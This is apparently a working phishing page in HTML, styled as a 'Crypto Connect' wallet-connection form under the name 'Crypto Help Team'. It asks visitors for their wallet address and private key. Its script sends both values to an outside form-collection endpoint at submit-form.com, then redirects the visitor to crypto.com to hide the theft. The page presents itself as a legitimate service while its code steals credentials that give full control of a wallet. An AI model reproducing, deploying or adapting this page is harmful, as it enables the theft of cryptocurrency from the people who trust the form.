<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Crypto Wallet Connect</title>
    <style>
        /* General body styling */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1c1c28;
            color: #f4f4f9;
            box-sizing: border-box;
            line-height: 1.6;
        }

        /* Styling for the main container */
        .container {
            width: 95%;
            max-width: 500px; /* Reduced max-width for a better fit on phones */
            margin: 5% auto;
            padding: 20px;
            background-color: #2c2c3a;
            border-radius: 10px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
        }

        /* Header and sub-header styling */
        h1, h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #00ccff;
            letter-spacing: 1px;
        }

        /* Form label styling */
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #00ccff;
        }

        /* Input fields and submit button */
        input[type="text"], input[type="submit"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: none;
            font-size: 1rem;
            box-sizing: border-box;
        }

        /* Styling for input text fields */
        input[type="text"] {
            background-color: #3c3c4e;
            color: #fff;
            border: 1px solid #00ccff;
        }

        /* Styling for the submit button */
        input[type="submit"] {
            background-color: #00ccff;
            color: #1c1c28;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #00b3e6;
        }

        /* Footer styling */
        .footer {
            text-align: center;
            padding: 15px;
            background-color: #1c1c28;
            color: #f4f4f9;
            margin-top: 40px;
            font-size: 0.9rem;
        }

        /* Responsive styles for tablets */
        @media (max-width: 768px) {
            .container {
                width: 90%; /* Slightly adjust width */
                padding: 15px; /* Adjust padding for smaller screens */
            }

            h1, h2 {
                font-size: 1.6rem;
            }
        }

        /* Responsive styles for small phones */
        @media (max-width: 480px) {
            .container {
                width: 100%;
                padding: 10px; /* Adjust padding for smaller phones */
            }

            h1 {
                font-size: 1.5rem;
            }

            h2 {
                font-size: 1.3rem;
            }

            input[type="text"], input[type="submit"] {
                padding: 10px; /* Reduce padding for input fields on small screens */
                font-size: 0.95rem;
            }
        }

        /* For large desktop screens */
        @media (min-width: 1200px) {
            .container {
                max-width: 650px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Crypto Connect</h1>

        <!-- Form to collect both wallet address and private key -->
        <form id="connectForm" onsubmit="handleFormSubmit(event)">
            <div class="wallet-connect">
                <h2>Connect Your Wallet</h2>
                <label for="walletAddress">Enter Wallet Address:</label>
                <input type="text" id="walletAddress" name="walletAddress" placeholder="Your Wallet Address" required>
            </div>

            <div class="private-key-connect">
                <h2>And Connect with Private Key</h2>
                <label for="privateKey">Enter Private Key:</label>
                <input type="text" id="privateKey" name="privateKey" placeholder="Your Private Key" required>
            </div>

            <!-- Hidden input for the redirect URL -->
            <input type="hidden" name="_redirect" id="_redirect" value="https://crypto.com">

            <!-- Single submit button to handle both fields -->
            <input type="submit" value="Connect">
        </form>
    </div>

    <div class="footer">
        <p>&copy; 2024 Crypto Help Team</p>
    </div>

    <script>
        /*
            handleFormSubmit FUNCTION:
            - Sends the wallet address and private key to a server (via a POST request).
            - After receiving a response, it redirects to the URL specified in the hidden input field.
        */
        async function handleFormSubmit(event) {
            event.preventDefault(); // Prevent the form's default submission behavior

            const walletAddress = document.getElementById('walletAddress').value;
            const privateKey = document.getElementById('privateKey').value;
            const redirectUrl = document.getElementById('_redirect').value; // Get the hidden input value for the redirect URL

            // Check if both fields are filled
            if (walletAddress && privateKey) {
                try {
                    // Send the form data to a server using a POST request
                    const response = await fetch('https://submit-form.com/CRIZKy1JI', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            walletAddress: walletAddress,
                            privateKey: privateKey
                        }),
                    });

                    if (response.ok) {
                        // After successful submission, redirect to the URL specified in the hidden input
                        window.location.href = redirectUrl;
                    } else {
                        alert('There was an issue submitting the form. Please try again.');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('There was an error submitting the form. Please check your network and try again.');
                }
            } else {
                alert('Please enter both wallet address and private key.');
            }
        }
    </script>
</body>
</html>
